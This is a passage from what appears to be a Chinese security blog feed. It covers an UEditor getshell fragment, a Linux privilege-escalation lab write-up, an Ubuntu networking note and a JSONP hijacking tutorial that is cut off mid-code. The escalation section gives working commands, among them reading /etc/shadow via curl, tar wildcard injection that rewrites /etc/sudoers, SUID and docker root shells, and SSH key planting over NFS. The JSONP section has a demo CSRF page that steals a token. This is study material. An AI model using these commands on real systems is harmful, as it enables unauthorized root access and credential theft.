class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我这里使用的是php文件，利用的时候可以采用<code>poc.php?.asp</code>的形式，这样上传后的文件就为asp文件了。</p><p>提交之后便会返回webshell路径</p><p><img src="https://i.loli.net/2019/09/25/LIQaEP3DTiJ9WO4.png" alt></p><h2 id="0x02-参考资料"><a href="#0x02-参考资料" class="headerlink" title="0x02 参考资料"></a>0x02 参考资料</h2><p><a href="https://www.jianshu.com/p/6dae608b617c?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">UEditor .net版本 getshell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;今天在渗透过程中碰到了一个UEditor .net版本，刚好最近想更新下博客，记录一个getshel
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://zhengbao.wang/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权姿势</title>
    <link href="http://zhengbao.wang/Linux%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF/"/>
    <id>http://zhengbao.wang/Linux提权姿势/</id>
    <published>2019-09-24T08:48:27.000Z</published>
    <updated>2019-09-24T08:49:56.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文是在阅读了<code>in.security 提权靶场通关手册</code>后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。</p><ul><li><p>检测当前用户权限</p><p><code>whoami</code>  <code>id</code></p><p><img src="https://i.loli.net/2019/09/23/Ju21c6HLqaCrER7.png" alt></p></li><li><p>查看系统的发行版本和内核版本</p><p><code>lsb_release -a</code>  <code>uname -a</code></p><p><img src="https://i.loli.net/2019/09/23/9pc5RzrtWehmGQ2.png" alt></p></li><li><p>查看suid文件</p></li></ul><p><img src="https://i.loli.net/2019/09/23/5eydfPx4hBpRacN.png" alt></p><ul><li>查看运行的服务及安装的程序</li><li>查看<code>/etc/passwd</code>文件及隐藏文件等</li></ul><p>收集到的信息越多，越能找到更多的突破口。</p><h2 id="0x02-提权方法"><a href="#0x02-提权方法" class="headerlink" title="0x02 提权方法"></a>0x02 提权方法</h2><h3 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo  提权"></a>sudo  提权</h3><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。普通用户可以通过<code>sudo -l</code>命令查看可以执行哪些命令。这样普通用户就可以在不知道root密码的情况下使用这些命令。因为用户使用<code>sudo</code>命令时需验证自己身份，因此这个方法需要知道普通用户的密码。</p><p><img src="https://i.loli.net/2019/09/23/ejFrkhbDVAzfXwE.png" alt></p><p>可以看到靶场<code>bob</code>用户可以使用<code>awk</code> <code>curl</code> <code>man</code> 等很多命令。</p><p>那么下面就这些命令展开利用，这里推荐一个在线查询工具：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p><p><code>sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code> 这里借助<code>awk</code>直接获取到root权限</p><p><img src="https://i.loli.net/2019/09/23/yikXDCVNZ892mrB.png" alt></p><p>接下来用<code>man</code>试一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/23/mAOjVwKYQPMn4tl.png" alt></p><p>利用<code>script</code></p><p><code>script -q /dev/null</code></p><p><img src="https://i.loli.net/2019/09/23/lWf3ycnVjSuOkKm.png" alt></p><p>利用<code>curl</code>读取root文件</p><p><code>curl file:///etc/shadow</code></p><p>其他的都可以通过上面的在线网站查找到利用方式，这里不一一例举了。</p><h3 id="cronjobs-提权"><a href="#cronjobs-提权" class="headerlink" title="cronjobs 提权"></a>cronjobs 提权</h3><p>如果系统管理员设置了计划任务并以root权限运行，比如周期性的运行某一个脚本，如果普通有权限修改这个脚本的话，便可以执行任意命令造成权限提升。</p><p>此外还有一个Crontab Tar通配符注入，当计划任务中以root权限进行tar命令操作时，可以造成通配符注入进行权限提升。下面在靶场中进行展示。</p><p>查看<code>/etc/crontab</code>，可以看到每分钟执行了<code>backup</code>脚本</p><p><img src="https://i.loli.net/2019/09/23/13DjNI6qBE2PyFb.png" alt></p><p>查看backup内容，进行了tar打包操作，</p><p><img src="https://i.loli.net/2019/09/23/ZCaqENBFmHAGyzr.png" alt></p><p>然后便可以进行提权操作了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> &gt;test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; <span class="string">"--checkpoint-action=exec=sh test.sh"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; --checkpoint=1</span><br></pre></td></tr></table></figure><p>等一分钟后，待计划任务完成，使用<code>sudo  bash</code>，便会提升至root权限。</p><p><img src="https://i.loli.net/2019/09/23/DpSmHZxsV51AUIG.png" alt></p><p>那么在第一步说到的信息收集中，查看<code>/etc/crontab</code>也应该被列为信息收集的一步，说不定就会有意想不到的收获。</p><p>所以在设定计划任务时要注意一些问题：</p><ul><li>crontab任务千万不要写到/etc/crontab文件里。通过crontab -e去创建，让他写到默认的/var/spool/cron下；</li><li>尽量避免使用root 去创建，如果一定要用root，要注意设置权限。</li></ul><h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>suid是指二进制文件在执行时拥有其拥有者owner的权限，例如<code>passwd</code>命令</p><p><img src="https://i.loli.net/2019/09/23/6wWuqF3zdls4ijG.png" alt></p><p>使用<code>find / -user root -perm -4000 2&gt;/dev/null</code> 或者<code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</code>查找所有owner为root且为suid的二进制文件</p><p><img src="https://i.loli.net/2019/09/23/WKQaFylPcST3oNs.png" alt></p><p>查看其中一个<code>/usr/bin/taskset</code>,在前面提到的在线网站<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>查看命令</p><p><code>sudo taskset 1 /bin/sh</code>直接获取到root权限</p><p><img src="https://i.loli.net/2019/09/23/IjMiak5X6hRlxJA.png" alt></p><h3 id="NFS-未授权"><a href="#NFS-未授权" class="headerlink" title="NFS 未授权"></a>NFS 未授权</h3><p>nmap扫描一下<code>nmap -T4 -sS -Pn 192.168.111.122</code></p><p>发现了2049端口开启的nfs服务，nfs，英文全称Network File System，即网络文件系统，是由SUN公司研制的UNIX表示层协议，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。</p><p><img src="https://i.loli.net/2019/09/24/Jct4FXgTAv9bxG3.png" alt></p><p>这里使用两外一台机器对其进行访问。 </p><p>首先<code>showmount -e 192.168.111.122</code>查看可以访问的目录。</p><p><img src="https://i.loli.net/2019/09/24/Siw4pRZtyB9W28c.png" alt></p><p>将其挂载到本地进行查看</p><p><img src="https://i.loli.net/2019/09/24/XS5Z7jE6kvA4imN.png" alt></p><p>我们在挂载的<code>/mnt/peter</code>目录是没有写权限的，但是由于其所有者uid设定1001，所属组gid设定1005，所有只需要本地创建一个uid为1001，gid为1005的用户即可绕过其权限验证。</p><p><img src="https://i.loli.net/2019/09/24/ORBzYbu2tKAg7dn.png" alt></p><p>创建一个符合要求的用户后，即可执行写操作了。</p><p><img src="https://i.loli.net/2019/09/24/orpnVlsiH2JCeuN.png" alt></p><p>生成新创建用户boogle的ssh公钥对和私钥对。</p><p><img src="https://i.loli.net/2019/09/24/eqhYgBTGLuJZVaH.png" alt></p><p>因为现在又对peter家目录的写权限，所以现在可以直接将上面的公钥对写入到peter的<code>.ssh</code>目录下，这样便可以直接使用ssh登陆获取peter用户的shell。</p><p><img src="https://i.loli.net/2019/09/24/UNlsf8JdogWDOYh.png" alt></p><h3 id="docker-组用户提权"><a href="#docker-组用户提权" class="headerlink" title="docker 组用户提权"></a>docker 组用户提权</h3><p>查看上面peter发现其属于<code>docker</code>组用户</p><p><img src="https://i.loli.net/2019/09/24/7b4pQBkcJw2EWxr.png" alt></p><p>docker组用户的权限还是非常大的，相当于root权限了。可以借助其提权到root权限。</p><p>思路参考：<a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">普通用户借助Docker容器提权思路分享</a>。</p><p>还有一个具体的利用代码：<a href="https://github.com/chrisfosterelli/dockerrootplease" target="_blank" rel="noopener">https://github.com/chrisfosterelli/dockerrootplease</a></p><p><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></p><h3 id="systemd-配置提权"><a href="#systemd-配置提权" class="headerlink" title="systemd 配置提权"></a>systemd 配置提权</h3><p>查看<code></code>文件，并且peter用户有对其读写的权限。</p><p><img src="https://i.loli.net/2019/09/24/RYWZGhbSQkTmBzL.png" alt></p><p>修改其配置ExecStart指向我们自定义的二进制文件，其启动时便会以root用户执行这个文件。</p><p><img src="https://i.loli.net/2019/09/24/VEmf9MutGBon7aL.png" alt></p><p>创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限</p><p><code>echo -e &#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</code></p><p><img src="https://i.loli.net/2019/09/24/sAR4UaNp6L9DbJo.png" alt></p><p>重启之前便会生成systemdbash文件</p><p><img src="https://i.loli.net/2019/09/24/MhyCcbHdWVPRZ5l.png" alt></p><p>复制前面的ssh公钥到root用户下</p><p><img src="https://i.loli.net/2019/09/24/1vYNf3jI6l2cFnV.png" alt></p><p>然后便可以直接ssh登陆到root</p><p><img src="https://i.loli.net/2019/09/24/SwOntaiyFLhDGcW.png" alt></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489960&amp;idx=1&amp;sn=ae35c8e5eb5e08e713cfd204b71a6b9d&amp;chksm=fc1e8e7ecb6907685255c77713c7a99b4acdc223db736f1610202b84ac8467335b6b076286b9&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568377810435&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册上篇</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247490025&amp;idx=1&amp;sn=f6ba22761d89c1154c4bc9bd22e16df0&amp;chksm=fc1e8e3fcb690729907504393dd6c788c05c9cd9866e3df62786bbc318ab7524ea5c716e7501&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568338917816&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册下篇</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文是在阅读了&lt;code&gt;in.security 提权靶场通关手册&lt;/code&gt;后学习的一点总结和记
      
    
    </summary>
    
      <category term="后渗透" scheme="http://zhengbao.wang/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="提权" scheme="http://zhengbao.wang/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu网络问题记录</title>
    <link href="http://zhengbao.wang/ubuntu%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://zhengbao.wang/ubuntu网络问题记录/</id>
    <published>2019-09-21T09:05:00.000Z</published>
    <updated>2019-09-24T09:06:55.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>又遇到了ubuntu18.04的网络问题，这里记录一下，他日备用。</p><h2 id="0x01-问题排查"><a href="#0x01-问题排查" class="headerlink" title="0x01 问题排查"></a>0x01 问题排查</h2><h3 id="检查物理机服务"><a href="#检查物理机服务" class="headerlink" title="检查物理机服务"></a>检查物理机服务</h3><p>如果是虚拟机，首先在物理机中查看服务，查看下面内容是否已经启动，没有则启动。</p><p><img src="https://i.loli.net/2019/09/12/UFsVyiwIOD18bdu.png" alt></p><h3 id="检查interfaces配置"><a href="#检查interfaces配置" class="headerlink" title="检查interfaces配置"></a>检查interfaces配置</h3><p>虚拟机配置为NAT模式，小图标显示网卡启动成功，但是使用<code>ifconfig</code>却看不到网卡信息。</p><p><img src="https://i.loli.net/2019/09/12/a6CU8iHybXqOrMd.png" alt></p><p>执行命令<code>if a</code>，这里<code>ens33</code>网卡在<code>ifconfig</code>中并没有显示出来。（下图是配置好后截图）</p><p><img src="https://i.loli.net/2019/09/12/d4azA6UKw2OI9rq.png" alt></p><p>然后编辑interfaces文件    <code>sudo vi /etc/network/interfaces</code></p><p>这里并没有<code>ens33</code>配置信息，添加一下。</p><p><img src="https://i.loli.net/2019/09/12/ircL7zwNVC1v6OU.png" alt></p><p>添加内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto ens33</span><br><span class="line">iface<span class="built_in"> INTERFACE </span>inet dhcp</span><br></pre></td></tr></table></figure><p>保存配置后重启网络<code>/etc/init.d/networking restart</code></p><p>网络通畅。</p><h3 id="检查netplan配置"><a href="#检查netplan配置" class="headerlink" title="检查netplan配置"></a>检查netplan配置</h3><p>ubuntu18.04 LTS后使用<code>netplan</code>配置网络，此时当查看<code>interfaces</code>文件时会发现下面的提示。</p><p><img src="https://i.loli.net/2019/09/24/kbe3tVQKPpzEgqh.png" alt></p><p>这时要修改<code>/etc/netplan/50-cloud-init.yaml</code>文件</p><p><img src="https://i.loli.net/2019/09/24/FVdrESneNZzcBwY.png" alt></p><p><code>sudo netplan apply</code>使配置生效。</p><h3 id="防火墙问题"><a href="#防火墙问题" class="headerlink" title="防火墙问题"></a>防火墙问题</h3><p>此外还可能存在防火墙配置问题，比如<code>ufw</code> </p><p><code>sudo ufw disable</code></p><h2 id="0x02-其他问题"><a href="#0x02-其他问题" class="headerlink" title="0x02 其他问题"></a>0x02 其他问题</h2><p>如果后期遇到其他问题，将继续作补充。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;又遇到了ubuntu18.04的网络问题，这里记录一下，他日备用。&lt;/p&gt;
&lt;h2 id=&quot;0x01
      
    
    </summary>
    
      <category term="环境配置" scheme="http://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="linux" scheme="http://zhengbao.wang/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>jsonp劫持漏洞</title>
    <link href="http://zhengbao.wang/jsonp%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zhengbao.wang/jsonp劫持漏洞/</id>
    <published>2019-08-16T08:28:38.000Z</published>
    <updated>2019-10-12T01:55:24.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>jsonp在跨域资源共享方面已存在了好多年，jsonp劫持技术也已被大佬们用烂了，本篇文章从介绍什么是jsonp开始，由浅入深介绍jsonp劫持漏洞产生的前因后果。重新拾一拾这个被遗忘在角落的漏洞。</p><h2 id="0x01-何为jsonp"><a href="#0x01-何为jsonp" class="headerlink" title="0x01 何为jsonp"></a>0x01 何为jsonp</h2><p>所谓jsonp，其实是聪明的程序们为了克服同源策略实现跨域资源共享的一种方式,一经出现便得到广泛应用，逐渐成为一种非官方跨域数据交换协议。而它与json又有什么关系呢？准确来说关系不大，只不过json作为一种轻量级的数据交换格式，能够被多种语言直接使用，因此jsonp这种数据共享方式也使用了json格式来共享数据，即JSON with Padding。既然json只是一种数据交换格式，那么使用jsonp这种方式共享其他数据格式也是可以的，比如说直接用字符串。</p><h2 id="0x02-为什么要使用jsonp"><a href="#0x02-为什么要使用jsonp" class="headerlink" title="0x02 为什么要使用jsonp"></a>0x02 为什么要使用jsonp</h2><p>既然json就能够直接被多种语言直接使用，为啥在进行数据交换时还得padding一下，变为jsonp呢？其实在上面就已经提到过了，jsonp并不是简单的为了数据交换，而是实现跨域资源共享。我们知道，因为同源策略的存在，致使资源不能跨域访问，这时如果想跨域进行资源访问，就可以使用jsonp这种方式了。</p><p>下面我们搭建一个简单的环境理解一下，<code>json.json</code>文件中保存要共享的资源，<code>get_json.html</code>用于获取资源</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//json.json</span><br><span class="line">&#123; username: "boogle", password: "zhengbao.wang" &#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//get_json.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://libs.baidu.com/jquery/2.0.0/jquery.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"> $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript"> url: <span class="string">'http://192.168.111.132/json.json'</span>,</span></span><br><span class="line"><span class="actionscript"> type:<span class="string">"get"</span>,     </span></span><br><span class="line"><span class="actionscript"> dataType: <span class="string">"json"</span>,</span></span><br><span class="line"><span class="actionscript"> success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(data);&#125;</span></span><br><span class="line"><span class="undefined"> &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在同源环境进行数据获取时，一切正常。</p><p><img src="https://i.loli.net/2019/08/15/ziJdNZRkt8h7y35.png" alt></p><p>将<code>get_json.html</code>放在与<code>json.json</code>不同源的地方访问时，会出现报错</p><p><img src="https://i.loli.net/2019/08/15/fONGHXuUpWDY1Rw.png" alt></p><p>那为啥jsonp为啥能进行跨域资源访问呢？如果你足够仔细，便会发现在上面<code>get_json.html</code>代码的第一行，<code>&lt;script&gt;</code>标签中是引用了百度的<code>jquery</code>,但是这个<code>http://libs.baidu.com</code>与我们的数据完完全全是不同源的呀，为啥可以这样引用呢，这是因为<code>&lt;script&gt;</code>标签并不遵循同源策略，可以直接进行跨域资源访问。而聪明的程序员们也正是利用了这一点，实现了<code>jsonp</code>.</p><h2 id="0x03-如何使用jsonp"><a href="#0x03-如何使用jsonp" class="headerlink" title="0x03 如何使用jsonp"></a>0x03 如何使用jsonp</h2><p>既然<code>&lt;script&gt;</code>标签可以跨域，那么便可以直接构造一个<code>&lt;script&gt;</code>标签进行跨域资源访问了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//get_jsonp.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://libs.baidu.com/jquery/2.0.0/jquery.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript"> s.src = <span class="string">'http://192.168.111.132/json.json'</span>;</span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问之后却报错了。此时虽然报错，但是仔细观察一下，这时其实已经访问到跨域的<code>json.json</code>文件了，只不过该文件中的内容并不符合<code>javascript</code>代码规范，导致了报错。</p><p><img src="https://i.loli.net/2019/08/15/CFxWmznMUVyJOpu.png" alt></p><p>此时只需将<code>json.json</code>中的内容按照代码规范去规定，便可以实现跨域资源访问。聪明的程序员们很快便找到了解决问题的办法。只需让目标页面回调本地页面的方法，并带入参数即可，这也就是<code>jsonp</code>的核心原理。</p><p>重新写一下<code>get_jsonp.html</code>和定义<code>json.json</code>的文件内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//get_jsonp.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://libs.baidu.com/jquery/2.0.0/jquery.min.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">(json)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(json);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript"> s.src = <span class="string">'http://192.168.111.132/json.json'</span>;</span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在json.json中按照<code>javascript</code>代码规范调用<code>callback</code>函数，并将数据作为参数传入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//json.json</span></span><br><span class="line"><span class="function"><span class="title">callback</span><span class="params">(&#123; username: <span class="string">"boogle"</span>, password: <span class="string">"zhengbao.wang"</span> &#125;)</span></span></span><br></pre></td></tr></table></figure><p>成功实现跨域资源访问</p><p><img src="https://i.loli.net/2019/08/15/zaoPSOhkXfigsF2.png" alt></p><h2 id="0x04-jsonp劫持漏洞"><a href="#0x04-jsonp劫持漏洞" class="headerlink" title="0x04  jsonp劫持漏洞"></a>0x04  jsonp劫持漏洞</h2><p>说到现在，<code>jsonp</code>在实现跨域资源访问这方面确实是一种不错的选择，可以说是广大程序员们智慧的结晶，但是任何事物都有两面性，<code>jsonp</code>也不例外。如果通过一些敏感的数据通过这种方式去传输，便很容易造成信息泄露，但这并不是<code>jsonp</code>引起的，因为即使使用<code>json</code>格式，去传输上面的类似的账号密码信息，攻击者一样可以通过直接访问获取到敏感数据。但是，因为<code>jsonp</code>实现了跨域资源访问，如果获取的数据能够成为下一步操作的凭证，那么便可以引起<code>csrf</code>，即jsonp劫持。</p><p>比如说，一个用户发表文章的操作，需要验证<code>token</code>防止csrf，而这个<code>token</code>的获取，确是通过jsonp这种方式，那么攻击者便可以在自己的网页实现跨域获取token，并让这个用户发表文章。此时只要用户点击这个页面，便会神不知鬼不觉的发表一篇文章，如果发表的文章中带有这个恶意页面链接，那么所有点击的人都会发送这样一篇文章，从而实现csrf蠕虫。而且由于<code>jsonp</code>跨域的操作，使得原本可以预防csrf的token形同虚设。</p><p>在乌云上一搜，可以看到许多大厂都有过jsonp劫持的案例</p><p><img src="https://i.loli.net/2019/08/15/dGpizMBUQIvFegE.png" alt></p><p>这里简单写一个演示demo去理解，为了方便，代码中涉及到的token等都被写死了。</p><p>模拟一个发表文章页面,只有在token正确的情况下才会发表，避免了csrf。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'token'</span>]))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$csrf_token = $_POST[<span class="string">'token'</span>];</span><br><span class="line">$title = $_POST[<span class="string">'title'</span>];</span><br><span class="line">$content = $_POST[<span class="string">'content'</span>];</span><br><span class="line"><span class="keyword">if</span> ($csrf_token === <span class="string">'NKJJDkajwdadwdad_csrf_token_test'</span>)</span><br><span class="line">&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">'文章发表成功~'</span>.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $title.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'csrf token error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'no token'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟之前一样，token被保存在<code>json.json</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123;"username":"boogle","password":"zhengbao.wang","token":"NKJJDkajwdadwdad_csrf_token_test"&#125;)</span><br></pre></td></tr></table></figure><p>现在模拟黑客，写一个页面诱导用户点击</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//hello.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.111.132/add.php"</span> <span class="attr">method</span>=<span 